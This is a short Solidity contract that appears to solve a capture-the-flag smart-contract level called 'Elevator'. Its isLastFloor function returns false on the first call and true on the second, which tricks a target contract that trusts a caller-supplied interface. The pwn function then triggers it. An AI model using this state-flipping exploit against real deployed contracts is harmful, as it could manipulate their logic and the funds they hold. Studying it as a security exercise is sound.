pragma solidity ^0.8.0;

interface Building {
  function goTo(uint _floor) external;
}

contract AttackElevator {
    address elevatorAddress = YOUR_INSTANCE_ADDRESS;
    Building public elevatorContract = Building(elevatorAddress);
    
    bool private penthouseButton;
    
    constructor() {
        penthouseButton = false;
    }

    function isLastFloor(uint) public returns (bool) {
         if (!penthouseButton) {
            penthouseButton = true;
            return false;
        } 
        return true;
    }
    
    function pwn() public {
    elevatorContract.goTo(3);
    }
}